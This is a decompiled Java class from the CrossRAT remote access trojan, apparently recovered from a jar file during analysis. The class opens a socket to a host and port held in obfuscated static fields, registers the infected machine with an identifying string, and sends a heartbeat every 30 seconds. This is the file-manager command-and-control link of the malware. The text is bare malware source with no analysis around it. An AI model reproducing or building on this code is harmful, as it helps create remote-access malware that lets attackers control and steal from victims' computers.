package crossrat;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.Socket;

final class f
  extends Thread
{
  public final void run()
  {
    new e();
    Object localObject = null;
    try
    {
      System.err.println("FILE MANAGER CONNECT");
      k.l = localObject = new Socket(k.b, k.c);
      DataOutputStream localDataOutputStream;
      (localDataOutputStream = new DataOutputStream(((Socket)localObject).getOutputStream())).writeBytes(k.g + k.d + k.z + k.d + "&&&");
      for (;;)
      {
        (localDataOutputStream = new DataOutputStream(k.l.getOutputStream())).writeBytes(k.A + k.d + "&&&");
        try
        {
          Thread.sleep(30000L);
        }
        catch (Exception localException1) {}
      }
    }
    catch (Exception localException2)
    {
      try
      {
        ((Socket)localObject).close();
      }
      catch (IOException localIOException)
      {
        (localObject = localIOException).printStackTrace();
      }
      System.err.println("FILE MANAGER ERROR CONNECT");
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\f.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */